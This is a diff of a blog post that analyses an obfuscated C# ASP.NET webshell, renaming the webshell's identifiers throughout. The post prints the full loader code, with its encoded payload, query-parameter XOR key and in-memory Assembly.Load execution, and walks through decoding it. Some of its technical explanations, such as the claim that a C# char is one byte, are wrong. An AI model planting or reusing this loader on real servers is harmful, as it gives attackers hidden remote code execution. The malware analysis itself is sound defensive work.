@@ -33,18 +33,18 @@ This article will explore a specific type of webshell, which is written in C# .N
 <%@ Import Namespace="System.IO" %>
 
 <script language="c#" runat="server">
-    string PRVd0cjlOk(string pText, int pEncKey)
+    string kOljc0dVRP(string pppText, int ppppEncKey)
     {
-        StringBuilder vfT71MQCiJ = new StringBuilder(pText);
-        StringBuilder vyvYADwdYw = new StringBuilder(pText.Length);
+        StringBuilder JiCQM17Tfv = new StringBuilder(pppText);
+        StringBuilder wYdwDAYvyv = new StringBuilder(pppText.Length);
         char c2TxEJ0uqP;
-        for (int i = 0; i < pText.Length; i++)
+        for (int i = 0; i < pppText.Length; i++)
         {
-            c2TxEJ0uqP = vfT71MQCiJ[i];
-            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ pEncKey); //this deycrept
-            vyvYADwdYw.Append(c2TxEJ0uqP);
+            c2TxEJ0uqP = JiCQM17Tfv[i];
+            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ ppppEncKey); //this deycrept
+            wYdwDAYvyv.Append(c2TxEJ0uqP);
         }
-        return vyvYADwdYw.ToString();
+        return wYdwDAYvyv.ToString();
     }
 
     void Page_Load(object sender, EventArgs e)
@@ -53,8 +53,8 @@ This article will explore a specific type of webshell, which is written in C# .N
         {
             if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
             {
-                string R0cRjZexhx = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FlMWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWUxbLFssWyxbLFssSHxZXFhsWUxIfFssWHxbLFncW9xbrFkcWUxbHFp8W+xIPFm8WlxbTFm8WDxZDFisWxxYTFkMWexIrFncWQxZ7FtcWHxbrFtMW9xZvFkcWexIbFhcWXxbDFscWaxanFoMWxxYrFl8WkxIfFlMWSxaTEh8WUxaHFtsSKxafFusW0xILFhcWpxbTFpsWGxbfFosSDxbjFucWyxbLFssWyxbLFssWyxbLFssWxxaLFocWixbLFssWnxbLFtsW3xbLFtsWbxIvFicWexb7FssWyxbLFssWyxbLFssWyxbLFssW8xbLFssWyxZrFtsW/xbLFosWUxbLFssWxxZTFssWyxbLFssW0xbLFssWyxbLFssWyxbLFssWVxZnFkMWyxbLFssWyxZTFssWyxbLFssWixbLFssWyxbLFssWxxbLFssWyxbLFlMWyxbLFssWyxbLFlMWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbbFssWyxbLFssWyxbLFssWyxbLFssWwxbLFssWyxbLFssWyxZTFssWyxbLFssWyxbLFssWyxb7FssWixbrFpsWyxbLFscWyxbLFssWxxbLFssWyxbLFssWyxbbFssWyxbLFtsWyxbLFssWyxbLFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWwxYTEgMWyxbLFscWjxbLFssWyxbLFssW2xbLFssWyxb/FlMWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFtMWyxbLFssWyxYTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFusWyxbLFssWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFsMWyxbLFssW2xZTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDEhsSDxanFq8WbxIPFssWyxbLFssWbxbHFkMWyxbLFssWyxZTFssWyxbLFssW0xbLFssWyxbLFssW6xbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFssWyxbLFtMWyxYbFkMWdxb3FisWqxYTFssWyxbLFv8WUxbDFssWyxbLFssWixbLFssWyxbLFssWixbLFssWyxbLFksWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWxxbLFssWyxbHFssW/xZ3FucWfxZHFtMSKxZnFssWyxbLFvsWyxbLFssWyxbLFtMWyxbLFssWyxbLFsMWyxbLFssWyxbvFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxaLFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFscWUxb3FhMWyxbLFssWyxbLFssWyxbbFlMWyxbLFssWyxbDFssWyxabFssW7xbDFlMWyxbLFscWyxaPFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";
-                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(PRVd0cjlOk(Encoding.UTF8.GetString(Convert.FromBase64String(R0cRjZexhx)), Convert.ToInt32(Request.QueryString["aps"]))));
+                string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FlMWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWUxbLFssWyxbLFssSHxZXFhsWUxIfFssWHxbLFncW9xbrFkcWUxbHFp8W+xIPFm8WlxbTFm8WDxZDFisWxxYTFkMWexIrFncWQxZ7FtcWHxbrFtMW9xZvFkcWexIbFhcWXxbDFscWaxanFoMWxxYrFl8WkxIfFlMWSxaTEh8WUxaHFtsSKxafFusW0xILFhcWpxbTFpsWGxbfFosSDxbjFucWyxbLFssWyxbLFssWyxbLFssWxxaLFocWixbLFssWnxbLFtsW3xbLFtsWbxIvFicWexb7FssWyxbLFssWyxbLFssWyxbLFssW8xbLFssWyxZrFtsW/xbLFosWUxbLFssWxxZTFssWyxbLFssW0xbLFssWyxbLFssWyxbLFssWVxZnFkMWyxbLFssWyxZTFssWyxbLFssWixbLFssWyxbLFssWxxbLFssWyxbLFlMWyxbLFssWyxbLFlMWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbbFssWyxbLFssWyxbLFssWyxbLFssWwxbLFssWyxbLFssWyxZTFssWyxbLFssWyxbLFssWyxb7FssWixbrFpsWyxbLFscWyxbLFssWxxbLFssWyxbLFssWyxbbFssWyxbLFtsWyxbLFssWyxbLFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWwxYTEgMWyxbLFscWjxbLFssWyxbLFssW2xbLFssWyxb/FlMWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFtMWyxbLFssWyxYTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFusWyxbLFssWwxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFsMWyxbLFssW2xZTFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDEhsSDxanFq8WbxIPFssWyxbLFssWbxbHFkMWyxbLFssWyxZTFssWyxbLFssW0xbLFssWyxbLFssW6xbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbDFssWyxbLFtMWyxYbFkMWdxb3FisWqxYTFssWyxbLFv8WUxbDFssWyxbLFssWixbLFssWyxbLFssWixbLFssWyxbLFksWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWxxbLFssWyxbHFssW/xZ3FucWfxZHFtMSKxZnFssWyxbLFvsWyxbLFssWyxbLFtMWyxbLFssWyxbLFsMWyxbLFssWyxbvFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWixbLFssWyxaLFlMWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFscWUxb3FhMWyxbLFssWyxbLFssWyxbbFlMWyxbLFssWyxbDFssWyxabFssW7xbDFlMWyxbLFscWyxaPFssWyxbLFscWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";
+                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
                 Page ou5ONZ7iYr = (Page)Activator.CreateInstance(oUDpGna3QY.GetTypes()[0]);
                 ou5ONZ7iYr.ProcessRequest(HttpContext.Current);
             }else
@@ -72,48 +72,48 @@ This article will explore a specific type of webshell, which is written in C# .N
 </script>
 ```
 
-### First Function `PRVd0cjlOk`
+### First Function `kOljc0dVRP`
 
-The first part of the webshell is `PRVd0cjlOk` function, where includes a two arguments `string pText`  and `int pEncKey.`
+The first part of the webshell is `kOljc0dVRP` function, where includes a two arguments `string pppText`  and `int ppppEncKey.`
 
-The first argument `pText` is a string encoded in ***UTF***-***16,*** each character is represented as two bytes **`00 00`** UTF-16 is commonly used in C# because it is the default encoding for the .NET Framework, which C# is built upon.
+The first argument `pppText` is a string encoded in ***UTF***-***16,*** each character is represented as two bytes **`00 00`** UTF-16 is commonly used in C# because it is the default encoding for the .NET Framework, which C# is built upon.
 
-The second argument **`pEncKey`** is an integer which is used as a key to decrypt the string in the first argument.
+The second argument **`ppppEncKey`** is an integer which is used as a key to decrypt the string in the first argument.
 
-The variables used in the **`PRVd0cjlOk`** function are as follows:
+The variables used in the **`kOljc0dVRP`** function are as follows:
 
-- `StringBuilder vfT71MQCiJ = new StringBuilder(pText);`
+- `StringBuilder JiCQM17Tfv = new StringBuilder(pppText);`
 
-**`StringBuilder`** is a class in .NET used for efficient string manipulation and acting as container of  a string. In the context of a webshell, it can be used by threat actors to construct malicious payloads as an internal buffer to store string data or any string. Based on MSDN, the capacity of the buffer is initially set to 16 characters, but it can automatically resize itself to accommodate larger strings. The `vfT71MQCiJ` variable is acting as input stream.
+**`StringBuilder`** is a class in .NET used for efficient string manipulation and acting as container of  a string. In the context of a webshell, it can be used by threat actors to construct malicious payloads as an internal buffer to store string data or any string. Based on MSDN, the capacity of the buffer is initially set to 16 characters, but it can automatically resize itself to accommodate larger strings. The `JiCQM17Tfv` variable is acting as input stream.
 
-- `StringBuilder vyvYADwdYw = new StringBuilder(pText.Length);`
+- `StringBuilder wYdwDAYvyv = new StringBuilder(pppText.Length);`
 
- Declare a new instance object from the class StringBuilder **`vyvYADwdYw`** and initialize it with a buffer capacity equal to the length of the input string **`pText`**. 
+ Declare a new instance object from the class StringBuilder **`wYdwDAYvyv`** and initialize it with a buffer capacity equal to the length of the input string **`pppText`**. 
 
-The StringBuilder object with the variable name `vyvYADwdYw`  will be utilized for the purpose of appending characters to the buffer.
+The StringBuilder object with the variable name `wYdwDAYvyv`  will be utilized for the purpose of appending characters to the buffer.
 
 - `char c2TxEJ0uqP;`
 
 The variable **`c2TxEJ0uqP`** has been created with the data type **`char`** , which occupies one byte (8 bits) of memory in C#. Therefore, the variable can hold a single character from the Unicode ASCII character set, but only occupies a small amount of memory to store its value. 
 
 ```csharp
-for (int i = 0; i < pText.Length; i++){
+for (int i = 0; i < pppText.Length; i++){
         {
-            c2TxEJ0uqP = vfT71MQCiJ[i]; // c2TxEJ0uqP is char && vfT71MQCiJ UTF-16
-            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ pEncKey); 
-            vyvYADwdYw.Append(c2TxEJ0uqP);
+            c2TxEJ0uqP = JiCQM17Tfv[i]; // c2TxEJ0uqP is char && JiCQM17Tfv UTF-16
+            c2TxEJ0uqP = (char)(c2TxEJ0uqP ^ ppppEncKey); 
+            wYdwDAYvyv.Append(c2TxEJ0uqP);
         }
-        return vyvYADwdYw.ToString(); 
+        return wYdwDAYvyv.ToString(); 
 	}
 ```
 
-To process the input, the program will iterate through it using a loop based on the size of the buffer. During this process, the **`vfT71MQCiJ`** string will be appended to the **`c2TxEJ0uqP`** string. It's important to note that **`vfT71MQCiJ`** is represented in UTF-16 format, which means that each character is represented by two bytes. Each two-byte character will be converted into one byte, effectively discarding the second byte and retaining the second. For instance, if we have the character **A** in UTF-16 format, it is represented by **`0x0041`** in Little Endian, which is two bytes. When it is appended to **`c2TxEJ0uqP`**, the second byte (0x00) will be ignored, and the first byte (0x41) will be appended. The casting here is implicit.
+To process the input, the program will iterate through it using a loop based on the size of the buffer. During this process, the **`JiCQM17Tfv`** string will be appended to the **`c2TxEJ0uqP`** string. It's important to note that **`JiCQM17Tfv`** is represented in UTF-16 format, which means that each character is represented by two bytes. Each two-byte character will be converted into one byte, effectively discarding the second byte and retaining the second. For instance, if we have the character **A** in UTF-16 format, it is represented by **`0x0041`** in Little Endian, which is two bytes. When it is appended to **`c2TxEJ0uqP`**, the second byte (0x00) will be ignored, and the first byte (0x41) will be appended. The casting here is implicit.
 
-In addition, the result of the operation will be appended to the string **`c2TxEJ0uqP`**. The operation **`(char)(c2TxEJ0uqP ^ pEncKey)`** involves performing an XOR operation, which is a commonly used cryptographic technique. Since **`pEncKey`** is represented as an integer and requires **explicit casting**, the **`(char)`** casting is utilized. This is because **`c2TxEJ0uqP`** is only one byte, whereas an integer is represented using four bytes.
+In addition, the result of the operation will be appended to the string **`c2TxEJ0uqP`**. The operation **`(char)(c2TxEJ0uqP ^ ppppEncKey)`** involves performing an XOR operation, which is a commonly used cryptographic technique. Since **`ppppEncKey`** is represented as an integer and requires **explicit casting**, the **`(char)`** casting is utilized. This is because **`c2TxEJ0uqP`** is only one byte, whereas an integer is represented using four bytes.
 
-**`vyvYADwdYw.Append(c2TxEJ0uqP);`** will append the one byte char value of  **`c2TxEJ0uqP`** to the buffer **`vyvYADwdYw`**. **`c2TxEJ0uqP`** represents a single byte, which will be appended as two bytes.
+**`wYdwDAYvyv.Append(c2TxEJ0uqP);`** will append the one byte char value of  **`c2TxEJ0uqP`** to the buffer **`wYdwDAYvyv`**. **`c2TxEJ0uqP`** represents a single byte, which will be appended as two bytes.
 
-After the buffer **`vyvYADwdYw`**  is modified by the **`Append()`** function, it will contain the appended bytes. The **`ToString()`** function will convert the buffer to a string representation of its contents.
+After the buffer **`wYdwDAYvyv`**  is modified by the **`Append()`** function, it will contain the appended bytes. The **`ToString()`** function will convert the buffer to a string representation of its contents.
 
 ### Second Function
 
@@ -124,8 +124,8 @@ void Page_Load(object sender, EventArgs e)
         {
             if (Request.QueryString["aps"] != null && !string.IsNullOrEmpty(Request.QueryString["aps"]))
             {
-                string R0cRjZexhx = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";//cut the payload
-                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(PRVd0cjlOk(Encoding.UTF8.GetString(Convert.FromBase64String(R0cRjZexhx)), Convert.ToInt32(Request.QueryString["aps"]))));
+                string xhxeZjRc0R = "xafFpcWCxaLFssWyxb7FssWyxbLFssW2xbLFssWyxbLEnMScxIvFssWyxb/FLFssWyxbLFssWyxbLFssWyxbLFssWyxbLFssWyxI4=";//cut the payload
+                Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));
                 Page ou5ONZ7iYr = (Page)Activator.CreateInstance(oUDpGna3QY.GetTypes()[0]);
                 ou5ONZ7iYr.ProcessRequest(HttpContext.Current);
             }else
@@ -144,21 +144,21 @@ The **`Page_Load`** method is executed every time a page is loaded at runtime. I
 
 So, if the URL of the current HTTP request is **`http://www.contoso.com/default.aspx?aps=222&name=Hamad`**, then **`Request.QueryString["aps"]`** would return "222", and **`Request.QueryString["name"]`** would return "Hamad". 
 
-- On other hand, as part of the function there exists variable that acts as an array called  `R0cRjZexhx` , which contains the payload, however, the payload is heavily obfuscated and has a larger size, as shown in Figure 1.
+- On other hand, as part of the function there exists variable that acts as an array called  `xhxeZjRc0R` , which contains the payload, however, the payload is heavily obfuscated and has a larger size, as shown in Figure 1.
 
 ![Figure 1: The obfuscated payload](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/Brute-ForceWebshell/Untitled.png)
 
 Figure 1: The obfuscated payload
 
-- `Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(PRVd0cjlOk(Encoding.UTF8.GetString(Convert.FromBase64String(R0cRjZexhx)), Convert.ToInt32(Request.QueryString["aps"]))));`
+- `Assembly oUDpGna3QY = Assembly.Load(Convert.FromBase64String(kOljc0dVRP(Encoding.UTF8.GetString(Convert.FromBase64String(xhxeZjRc0R)), Convert.ToInt32(Request.QueryString["aps"]))));`
 
 In addition, the function creates a new instance object called **`oUDpGna3QY`** from the **`Assembly`** class, which contains the **`Assembly.Load`** method. This method is responsible for loading compiled files, such as .dll and .exe, into memory without modifying the file system. The loaded assembly can be accessed for its metadata and types, and it also allows for dynamic code execution. It loads the payload from memory.
 
 However, by breaking down the obfuscated payload into parts, it becomes easier to understand:
 
-- `var a1` = `Convert.FromBase64String(R0cRjZexhx); //from string to binary(UTF-8)`
+- `var a1` = `Convert.FromBase64String(xhxeZjRc0R); //from string to binary(UTF-8)`
 
-The code **`var a1 = Convert.FromBase64String(R0cRjZexhx);`** will take the string **`R0cRjZexhx`** as input, which is encoded in Base64 format. The **`Convert.FromBase64String`** method will then decode this Base64 string and convert it into a binary format, and the resulting binary data will be stored in the variable **`a1`**. Essentially, **`a1`** will contain the original data that was encoded in Base64 format in the string **`R0cRjZexhx`**, but now it will be in binary format instead of string format.
+The code **`var a1 = Convert.FromBase64String(xhxeZjRc0R);`** will take the string **`xhxeZjRc0R`** as input, which is encoded in Base64 format. The **`Convert.FromBase64String`** method will then decode this Base64 string and convert it into a binary format, and the resulting binary data will be stored in the variable **`a1`**. Essentially, **`a1`** will contain the original data that was encoded in Base64 format in the string **`xhxeZjRc0R`**, but now it will be in binary format instead of string format.
 
 - `var a2` = `Encoding.UTF8.GetString(**a1**); //Convert from from binary to string object (UTF16).`
 
@@ -172,9 +172,9 @@ So, **`a2`** will contain the string representation of the original data that wa
 
 The key is accessed using `Request.QueryString["aps"]` and then converted to 32-bit integer by passing it to `Convert.ToInt32`.
 
-- `var a3 = PRVd0cjlOk(a2, key); // decrypt the UTF-16 strin`
+- `var a3 = kOljc0dVRP(a2, key); // decrypt the UTF-16 strin`
 
-The previously mentioned `PRVd0cjlOk` function is called, the string `a2` is in UTF16 format and passed as the first argument, while the second argument is used for the key. The Result `a3` is base64 string. 
+The previously mentioned `kOljc0dVRP` function is called, the string `a2` is in UTF16 format and passed as the first argument, while the second argument is used for the key. The Result `a3` is base64 string. 
 
 - `var v4` = `Convert.FromBase64String(a3);`
 
@@ -191,7 +191,7 @@ The final step of this function is to load the compiled binary into memory for e
 3. Take the UTF-16 string and decrypt it with the XOR function
 4. Decode the UTF-16 string as base64 and you get PE file.
 
-- **Step 1: `var a1` = `Convert.FromBase64String(R0cRjZexhx);`**
+- **Step 1: `var a1` = `Convert.FromBase64String(xhxeZjRc0R);`**
 
 Obtain the input string as UTF-8 and convert to binary.
 
@@ -215,7 +215,7 @@ Figure 4: One UTF-8 charater is encoded to UTF-16
 
 The UTF-8 character `**ŧť`** is encoded to UTF-16 bytes **`(0x167, 0x165)`  .** 
 
-- **Step 3: `var a3` = `PRVd0cjlOk(a2, Convert.ToInt32(Request.QueryString["aps"]));`**
+- **Step 3: `var a3` = `kOljc0dVRP(a2, Convert.ToInt32(Request.QueryString["aps"]));`**
 
 The UTF-16 string will be decrypted with key (0x133) using casting and XOR. Here are the steps:
 
